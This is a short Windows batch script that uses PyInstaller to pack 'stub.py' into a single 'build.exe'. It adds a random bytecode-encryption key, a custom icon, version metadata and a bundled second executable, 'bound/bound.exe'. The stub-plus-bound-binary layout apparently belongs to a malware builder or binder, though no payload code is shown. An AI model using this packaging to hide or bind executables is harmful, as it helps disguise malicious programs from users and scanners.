if exist "icon.ico" (set "icon=icon.ico") else (set "icon=NONE")
set key=%random%%random%%random%%random%
set key=%key:~-16%

pyinstaller %mode% --onefile --clean --noconfirm "stub.py" --key %key% --name "build.exe" ^
    --hidden-import urllib3 --hidden-import ctypes --hidden-import json --hidden-import python3-nmap ^
    -i "bound/icon.ico" ^
    --add-binary "bound/bound.exe;bound" --add-data "bound/*;bound" ^
    --version-file version.txt
